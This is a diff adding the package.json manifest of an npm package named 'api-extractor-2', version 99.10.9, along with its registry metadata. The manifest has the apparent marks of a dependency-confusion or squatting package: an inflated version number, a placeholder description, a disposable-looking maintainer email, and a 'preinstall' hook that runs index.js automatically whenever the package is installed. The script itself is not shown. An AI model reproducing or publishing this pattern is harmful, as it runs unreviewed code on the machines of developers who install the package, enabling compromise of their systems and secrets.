@@ -1,0 +1,39 @@
+{
+    "name": "api-extractor-2",
+    "version": "99.10.9",
+    "description": "howbit package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo 'error no test specified' && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "api-extractor-2@99.10.9",
+    "_nodeVersion": "16.14.2",
+    "_npmVersion": "8.5.0",
+    "dist": {
+        "integrity": "sha512-sr72C4VT2duF3Eq6IyCi6UKHPyMxUTa4KOL0G6c5nupXZsdxTc57zHFSIJjmLu8TeZqayfKJBDkQntZjgCZQfA==",
+        "shasum": "2dc0b43f414d3559d752299fa0bde314de2201e1",
+        "tarball": "https://registry.npmjs.org/api-extractor-2/-/api-extractor-2-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 6714,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQbGdACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmozgA/7Bqsa85P9Hy5rA4m/+zjjrdf1/yrp3tEfYMFaGDKR+w8sZ0cc\r\nOf+ngFj+DiKS64HmastlwYfSF++q9dky9EharhDzmo9CdyELQUMs5uwqF1rl\r\n4Kd+xdPA6ADRKue4J7FvY2t6SmQWYyA4th+T1zHNnFnmDetWH95BPzHGPC1C\r\nVCW12s0/OJcmz1RyUf/5IHz3p/L6TesHcgoA10B+LnTe4FEWIRvvz4cDmGvb\r\n8eoylXZmkiIBTLtNypKgPWvmWzjLdaWPdDWleWyPx4MSOlWB1FSXpluG8sem\r\nQGA3nSq0RzyDBbn51bZ3poU1CH/7EB9kpIlhexMGQrhAk24JbDQGW4XdfWUO\r\n+9beJ9SdtUVZaznQkMbnI7EpOJbpGSFO1zhuoffNvhV5LYQH+3KPRbfARBHE\r\nByq2C+Ly/gVlRkx9KftHGcgjnkIP+u8shz3fWk9gpB6reIMJDTmqxrLr+A2D\r\nTBf96YFpI+dryoCTl8iG09J/d6FfrljbMDjQlPJC3xY5Hhsxp3IGSwgGpGzw\r\niV//k5NEVZ5XVU4QOXh3h7BLOpL6KcLZ+xGd4NlnhLQudsittcP0reQXv4bc\r\nsmjHPWHah/i8Ub6816fK4GdE5oM77jyJ+Jh4YxWdukdqYTrc895rvitdcN54\r\nVQpwSY/VLbHyj8W1M869C9cExIYSPinCguQ=\r\n=WUTK\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "hcrndpqd",
+        "email": "hcrndpqd@33mail.ga"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "hcrndpqd",
+            "email": "hcrndpqd@33mail.ga"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/api-extractor-2_99.10.9_1648472477726_0.7405734937051107"
+    },
+    "_hasShrinkwrap": false
+}
